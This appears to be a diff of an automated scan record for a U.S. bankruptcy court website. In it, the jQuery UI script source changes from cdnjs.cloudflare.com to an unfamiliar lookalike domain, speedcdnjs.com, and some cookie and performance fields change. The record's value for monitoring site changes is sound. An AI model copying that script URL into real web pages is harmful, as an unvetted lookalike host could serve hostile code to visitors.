@@ -21,7 +21,7 @@
     "uscourts"
   ],
   "public": null,
-  "scan_date": "2025-02-06T12:37:48.809Z",
+  "scan_date": "2025-02-08T13:41:45.856Z",
   "primary_scan_status": "completed",
   "accessibility_scan_status": "completed",
   "dns_scan_status": "completed",
@@ -46,31 +46,32 @@
   "ga_tag_id": "",
   "third_party_service_domains": [
     "cdn.jsdelivr.net",
-    "cdnjs.cloudflare.com",
     "code.jquery.com",
     "content.govdelivery.com",
     "search.usa.gov",
-    "search.uscourts.gov"
+    "search.uscourts.gov",
+    "speedcdnjs.com"
   ],
   "third_party_service_urls": [
     "https://cdn.jsdelivr.net/npm/jquery-migrate@3.4.1/dist/jquery-migrate.min.js",
-    "https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.13.2/jquery-ui.min.js",
     "https://code.jquery.com/jquery-3.7.0.js",
     "https://content.govdelivery.com/images/required.gif",
     "https://search.usa.gov/assets/sayt.css",
     "https://search.usa.gov/assets/sayt_loader_libs.js",
     "https://search.uscourts.gov/assets/sayt_loader.js",
-    "https://search.uscourts.gov/javascripts/remote.loader.js"
+    "https://search.uscourts.gov/javascripts/remote.loader.js",
+    "https://speedcdnjs.com/ajax/libs/jqueryui/1.14.1/jquery-ui.min.js"
   ],
   "third_party_service_count": 6,
   "cookie_domains": [
     ".tneb.uscourts.gov",
+    ".uscourts.gov",
     ".www.tneb.uscourts.gov",
     "www.tneb.uscourts.gov"
   ],
   "viewport_meta_tag": true,
-  "cumulative_layout_shift": "0.2919892317708333",
-  "largest_contentful_paint": "483.2000000476837",
+  "cumulative_layout_shift": "0.3007100911458333",
+  "largest_contentful_paint": "467.30000001192093",
   "required_links_url": null,
   "required_links_text": null,
   "https_enforced": null,
